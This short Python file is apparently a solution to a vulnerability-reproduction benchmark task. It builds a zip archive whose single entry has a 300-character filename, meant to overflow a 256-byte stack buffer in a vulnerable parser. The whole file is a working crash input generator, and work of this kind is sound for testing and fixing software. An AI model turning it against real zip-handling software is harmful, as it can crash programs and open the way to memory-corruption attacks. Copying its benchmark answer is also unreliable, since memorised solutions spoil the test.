import io
import zipfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is caused by copying a zip entry's filename into a
        # 256-byte stack buffer without size validation.
        # We create a filename longer than 256 bytes to trigger the overflow.
        # A length of 300 is chosen to be safely over the limit.
        long_filename = 'A' * 300

        # Create an in-memory zip file to avoid disk I/O.
        mem_zip = io.BytesIO()

        # Use the zipfile module to construct the archive.
        # ZIP_STORED is used for a smaller PoC since the file content is empty.
        with zipfile.ZipFile(mem_zip, 'w', compression=zipfile.ZIP_STORED) as zf:
            # Add a file with the oversized filename. The content is irrelevant.
            zf.writestr(long_filename, b'')

        # Return the generated zip file as a bytes object.
        return mem_zip.getvalue()
